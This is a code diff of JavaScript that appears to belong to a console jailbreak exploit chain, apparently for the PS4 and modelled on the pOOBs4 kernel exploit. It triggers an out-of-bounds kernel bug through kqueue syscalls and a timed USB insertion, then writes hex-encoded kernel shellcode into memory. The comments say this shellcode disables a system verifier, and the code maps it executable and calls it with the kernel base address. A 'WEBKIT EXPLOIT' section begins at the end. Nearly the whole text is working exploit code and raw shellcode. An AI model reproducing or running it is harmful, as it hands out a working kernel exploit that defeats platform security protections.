-    patch_buffer_view[64] = 0x3D014800;
-    patch_buffer_view[65] = 0x00000288;
-    patch_buffer_view[66] = 0x893D0148;
-    patch_buffer_view[67] = 0x48000002;
-    patch_buffer_view[68] = 0x028A3D01;
-    patch_buffer_view[69] = 0x01480000;
-    patch_buffer_view[70] = 0x00028B3D;
-    patch_buffer_view[71] = 0x3D014800;
-    patch_buffer_view[72] = 0x0000024C;
-    patch_buffer_view[73] = 0x3D3D0148;
-    patch_buffer_view[74] = 0xC3000002;
-    patch_buffer_view[75] = 0xE5894855;
-    patch_buffer_view[76] = 0x10EC8348;
-    patch_buffer_view[77] = 0x24348948;
-    patch_buffer_view[78] = 0x24548948;
-    patch_buffer_view[79] = 0xED15FF08;
-    patch_buffer_view[80] = 0x48000001;
-    patch_buffer_view[81] = 0x4B74C085;
-    patch_buffer_view[82] = 0x48C28948;
-    patch_buffer_view[83] = 0x4840408B;
-    patch_buffer_view[84] = 0x2F74C085;
-    patch_buffer_view[85] = 0x28788B48;
-    patch_buffer_view[86] = 0x243C3B48;
-    patch_buffer_view[87] = 0x8B480A74;
-    patch_buffer_view[88] = 0xC0854800;
-    patch_buffer_view[89] = 0xECEB1D74;
-    patch_buffer_view[90] = 0x18788B48;
-    patch_buffer_view[91] = 0x74FF8548;
-    patch_buffer_view[92] = 0x7F8B48ED;
-    patch_buffer_view[93] = 0x7C3B4810;
-    patch_buffer_view[94] = 0xE2750824;
-    patch_buffer_view[95] = 0xFF1040C7;
-    patch_buffer_view[96] = 0x48FFFFFF;
-    patch_buffer_view[97] = 0x31107A8D;
-    patch_buffer_view[98] = 0x31D231F6;
-    patch_buffer_view[99] = 0xA515FFC9;
-    patch_buffer_view[100] = 0x48000001;
-    patch_buffer_view[101] = 0x5D10C483;
-    patch_buffer_view[102] = 0x894855C3;
-    patch_buffer_view[103] = 0xC0200FE5;
-    patch_buffer_view[104] = 0xFFFF2548;
-    patch_buffer_view[105] = 0x220FFFFE;
-    patch_buffer_view[106] = 0x3D8B48C0;
-    patch_buffer_view[107] = 0x000001C8;
-    patch_buffer_view[108] = 0x909007C7;
-    patch_buffer_view[109] = 0x47C79090;
-    patch_buffer_view[110] = 0x48909004;
-    patch_buffer_view[111] = 0x358B48B8;
-    patch_buffer_view[112] = 0x000001AC;
-    patch_buffer_view[113] = 0x08778948;
-    patch_buffer_view[114] = 0x651047C7;
-    patch_buffer_view[115] = 0xC73C8B48;
-    patch_buffer_view[116] = 0x00251447;
-    patch_buffer_view[117] = 0x47C70000;
-    patch_buffer_view[118] = 0x89480018;
-    patch_buffer_view[119] = 0x1C47C738;
-    patch_buffer_view[120] = 0xB8489090;
-    patch_buffer_view[121] = 0x7D358B48;
-    patch_buffer_view[122] = 0x48000001;
-    patch_buffer_view[123] = 0xC7207789;
-    patch_buffer_view[124] = 0xC7482847;
-    patch_buffer_view[125] = 0x47C70100;
-    patch_buffer_view[126] = 0x0000002C;
-    patch_buffer_view[127] = 0x778D48E9;
-    patch_buffer_view[128] = 0x158B4834;
-    patch_buffer_view[129] = 0x00000150;
-    patch_buffer_view[130] = 0x89F22948;
-    patch_buffer_view[131] = 0x8B483057;
-    patch_buffer_view[132] = 0x00016B35;
-    patch_buffer_view[133] = 0x568D4800;
-    patch_buffer_view[134] = 0xD7294805;
-    patch_buffer_view[135] = 0xC148FF89;
-    patch_buffer_view[136] = 0x814808E7;
-    patch_buffer_view[137] = 0x0000E9CF;
-    patch_buffer_view[138] = 0x3E894800;
-    patch_buffer_view[139] = 0x00000D48;
-    patch_buffer_view[140] = 0x220F0001;
-    patch_buffer_view[141] = 0x55C35DC0;
-    patch_buffer_view[142] = 0x0FE58948;
-    patch_buffer_view[143] = 0x2548C020;
-    patch_buffer_view[144] = 0xFFFEFFFF;
-    patch_buffer_view[145] = 0x48C0220F;
-    patch_buffer_view[146] = 0x013A3D8B;
-    patch_buffer_view[147] = 0x07C70000;
-    patch_buffer_view[148] = 0x00C3C031;
-    patch_buffer_view[149] = 0x353D8B48;
-    patch_buffer_view[150] = 0xC7000001;
-    patch_buffer_view[151] = 0xC3C03107;
-    patch_buffer_view[152] = 0x3D8B4800;
-    patch_buffer_view[153] = 0x00000130;
-    patch_buffer_view[154] = 0xC03107C7;
-    patch_buffer_view[155] = 0x8B4800C3;
-    patch_buffer_view[156] = 0x00012B3D;
-    patch_buffer_view[157] = 0x3107C700;
-    patch_buffer_view[158] = 0x4800C3C0;
-    patch_buffer_view[159] = 0x00A63D8B;
-    patch_buffer_view[160] = 0x87C70000;
-    patch_buffer_view[161] = 0x001F1E01;
-    patch_buffer_view[162] = 0x9090F631;
-    patch_buffer_view[163] = 0x1E0587C7;
-    patch_buffer_view[164] = 0xC931001F;
-    patch_buffer_view[165] = 0x87C79090;
-    patch_buffer_view[166] = 0x001F1E09;
-    patch_buffer_view[167] = 0x9090D231;
-    patch_buffer_view[168] = 0x1E3E87C7;
-    patch_buffer_view[169] = 0xC931001F;
-    patch_buffer_view[170] = 0x0D489090;
-    patch_buffer_view[171] = 0x00010000;
-    patch_buffer_view[172] = 0xFFC0220F;
-    patch_buffer_view[173] = 0x0000EF15;
-    patch_buffer_view[174] = 0xC0200F00;
-    patch_buffer_view[175] = 0xFFFF2548;
-    patch_buffer_view[176] = 0x220FFFFE;
-    patch_buffer_view[177] = 0x3D8B48C0;
-    patch_buffer_view[178] = 0x000000DC;
-    patch_buffer_view[179] = 0xC03107C7;
-    patch_buffer_view[180] = 0x0D4800C3;
-    patch_buffer_view[181] = 0x00010000;
-    patch_buffer_view[182] = 0x5DC0220F;
-    patch_buffer_view[183] = 0x737973C3;
-    patch_buffer_view[184] = 0x5F6D6574;
-    patch_buffer_view[185] = 0x70737573;
-    patch_buffer_view[186] = 0x5F646E65;
-    patch_buffer_view[187] = 0x73616870;
-    patch_buffer_view[188] = 0x705F3265;
-    patch_buffer_view[189] = 0x735F6572;
-    patch_buffer_view[190] = 0x00636E79;
-    patch_buffer_view[191] = 0x74737973;
-    patch_buffer_view[192] = 0x725F6D65;
-    patch_buffer_view[193] = 0x6D757365;
-    patch_buffer_view[194] = 0x68705F65;
-    patch_buffer_view[195] = 0x32657361;
-    patch_buffer_view[196] = 0x73797300;
-    patch_buffer_view[197] = 0x5F6D6574;
-    patch_buffer_view[198] = 0x75736572;
-    patch_buffer_view[199] = 0x705F656D;
-    patch_buffer_view[200] = 0x65736168;
-    patch_buffer_view[201] = 0x90900033;
-    patch_buffer_view[202] = 0x00000000;
-    patch_buffer_view[203] = 0x00000000;
-    patch_buffer_view[204] = 0x000F88F0;
-    patch_buffer_view[205] = 0x00000000;
-    patch_buffer_view[206] = 0x002EF170;
-    patch_buffer_view[207] = 0x00000000;
-    patch_buffer_view[208] = 0x00018DF0;
-    patch_buffer_view[209] = 0x00000000;
-    patch_buffer_view[210] = 0x00018EF0;
-    patch_buffer_view[211] = 0x00000000;
-    patch_buffer_view[212] = 0x02654110;
-    patch_buffer_view[213] = 0x00000000;
-    patch_buffer_view[214] = 0x00097230;
-    patch_buffer_view[215] = 0x00000000;
-    patch_buffer_view[216] = 0x00402E60;
-    patch_buffer_view[217] = 0x00000000;
-    patch_buffer_view[218] = 0x01520108;
-    patch_buffer_view[219] = 0x00000000;
-    patch_buffer_view[220] = 0x01520100;
-    patch_buffer_view[221] = 0x00000000;
-    patch_buffer_view[222] = 0x00462D20;
-    patch_buffer_view[223] = 0x00000000;
-    patch_buffer_view[224] = 0x00462DFC;
-    patch_buffer_view[225] = 0x00000000;
-    patch_buffer_view[226] = 0x006259A0;
-    patch_buffer_view[227] = 0x00000000;
-    patch_buffer_view[228] = 0x006268D0;
-    patch_buffer_view[229] = 0x00000000;
-    patch_buffer_view[230] = 0x00625DC0;
-    patch_buffer_view[231] = 0x00000000;
-    patch_buffer_view[232] = 0x00626290;
-    patch_buffer_view[233] = 0x00000000;
-    patch_buffer_view[234] = 0x00626720;
-    patch_buffer_view[235] = 0x00000000;
-    //lock payload / call payload / release payload
+//Trigger OOB
+    //Trigger OOB
+    alert("Insert USB now. do not close the dialog until notification pops, remove usb after closing it.");
+    for (var i = 1; i < NUM_KQUEUES; i += 2) {
+        chain.fcall(window.syscalls[6], kqueues[i]);
+    }
+    chain.run();
+
+    if (chain.syscall(23, 0).low == 0) 
     {
+        //cleanup fake knote & release locked gadgets/stack.
+        chain.fcall(window.syscalls[73], 0x4000, 0xC000);
+        chain.fcall(window.syscalls[325]);
+        chain.run();
+        
+        //This disables sysveri, see https://github.com/ChendoChap/pOOBs4/blob/main/patch.s for more info
+        var patch_buffer = chain.syscall(477, 0x0, 0x4000, 0x7, 0x1000, 0xFFFFFFFF, 0);
+        var patch_buffer_view = p.array_from_address(patch_buffer, 0x1000);
+        var PatchPl = [0x00000BB8,0xFE894800,0x033D8D48,0x0F000000,0x4855C305,0x8B48E589,0x95E8087E,0xE8000000,0x00000175,0x033615FF,0x8B480000,0x0003373D,0x3F8B4800,0x74FF8548,0x3D8D48EB,0x0000029D,0xF9358B48,0x48000002,0x0322158B,0x8B480000,0x00D6E812,0x8D480000,0x00029F3D,0x358B4800,0x000002E4,0x05158B48,0x48000003,0xB9E8128B,0x48000000,0x02633D8D,0x8B480000,0x0002BF35,0x158B4800,0x000002C8,0xE8128B48,0x0000009C,0x7A3D8D48,0x48000002,0x02AA358B,0x8B480000,0x0002AB15,0x128B4800,0x00007FE8,0x0185E800,0xC35D0000,0x6D3D8948,0x48000002,0x026E3D01,0x01480000,0x00026F3D,0x3D014800,0x00000270,0x713D0148,0x48000002,0x02723D01,0x01480000,0x0002933D,0x3D014800,0x00000294,0x653D0148,0x48000002,0x02663D01,0x01480000,0x0002873D,0x3D014800,0x00000288,0x893D0148,0x48000002,0x028A3D01,0x01480000,0x00028B3D,0x3D014800,0x0000024C,0x3D3D0148,0xC3000002,0xE5894855,0x10EC8348,0x24348948,0x24548948,0xED15FF08,0x48000001,0x4B74C085,0x48C28948,0x4840408B,0x2F74C085,0x28788B48,0x243C3B48,0x8B480A74,0xC0854800,0xECEB1D74,0x18788B48,0x74FF8548,0x7F8B48ED,0x7C3B4810,0xE2750824,0xFF1040C7,0x48FFFFFF,0x31107A8D,0x31D231F6,0xA515FFC9,0x48000001,0x5D10C483,0x894855C3,0xC0200FE5,0xFFFF2548,0x220FFFFE,0x3D8B48C0,0x000001C8,0x909007C7,0x47C79090,0x48909004,0x358B48B8,0x000001AC,0x08778948,0x651047C7,0xC73C8B48,0x00251447,0x47C70000,0x89480018,0x1C47C738,0xB8489090,0x7D358B48,0x48000001,0xC7207789,0xC7482847,0x47C70100,0x0000002C,0x778D48E9,0x158B4834,0x00000150,0x89F22948,0x8B483057,0x00016B35,0x568D4800,0xD7294805,0xC148FF89,0x814808E7,0x0000E9CF,0x3E894800,0x00000D48,0x220F0001,0x55C35DC0,0x0FE58948,0x2548C020,0xFFFEFFFF,0x48C0220F,0x013A3D8B,0x07C70000,0x00C3C031,0x353D8B48,0xC7000001,0xC3C03107,0x3D8B4800,0x00000130,0xC03107C7,0x8B4800C3,0x00012B3D,0x3107C700,0x4800C3C0,0x00A63D8B,0x87C70000,0x001F1E01,0x9090F631,0x1E0587C7,0xC931001F,0x87C79090,0x001F1E09,0x9090D231,0x1E3E87C7,0xC931001F,0x0D489090,0x00010000,0xFFC0220F,0x0000EF15,0xC0200F00,0xFFFF2548,0x220FFFFE,0x3D8B48C0,0x000000DC,0xC03107C7,0x0D4800C3,0x00010000,0x5DC0220F,0x737973C3,0x5F6D6574,0x70737573,0x5F646E65,0x73616870,0x705F3265,0x735F6572,0x00636E79,0x74737973,0x725F6D65,0x6D757365,0x68705F65,0x32657361,0x73797300,0x5F6D6574,0x75736572,0x705F656D,0x65736168,0x90900033,0x00000000,0x00000000,0x000F88F0,0x00000000,0x002EF170,0x00000000,0x00018DF0,0x00000000,0x00018EF0,0x00000000,0x02654110,0x00000000,0x00097230,0x00000000,0x00402E60,0x00000000,0x01520108,0x00000000,0x01520100,0x00000000,0x00462D20,0x00000000,0x00462DFC,0x00000000,0x006259A0,0x00000000,0x006268D0,0x00000000,0x00625DC0,0x00000000,0x00626290,0x00000000,0x00626720,0x00000000];
+        for(var i=0; i < PatchPl.length; i++)
+        {
+          patch_buffer_view[i] = PatchPl[i];
+        }
         chain.fcall(window.syscalls[203], patch_buffer, 0x4000);
         chain.fcall(patch_buffer, p.read8(KERNEL_BASE_PTR));
         chain.fcall(window.syscalls[73], patch_buffer, 0x4000);
+        chain.run();
+        //Add to counter
+        localStorage.passcount = ++localStorage.passcount;window.passCounter.innerHTML=localStorage.passcount;
+        alert("Jailbreak Done!!!... Please Remove USB Drive.");
     }
-    chain.run();
+    else
+    {
+        localStorage.failcount = ++localStorage.failcount;window.failCounter.innerHTML=localStorage.failcount;
+        alert(`Failed to trigger the exploit,  This happened because you plugged it in too late/early or not at all.
+        if you did plug it in then the kernel heap is slightly corrupted, this might cause panics later on.
+        closing this alert will crash the browser for you.`);
+        p.write8(0, 0);
+    }
 }
+
 /////////////////////////////WEBKIT EXPLOIT
 var PAGE_SIZE = 16384;
 var SIZEOF_CSS_FONT_FACE = 0xb8;
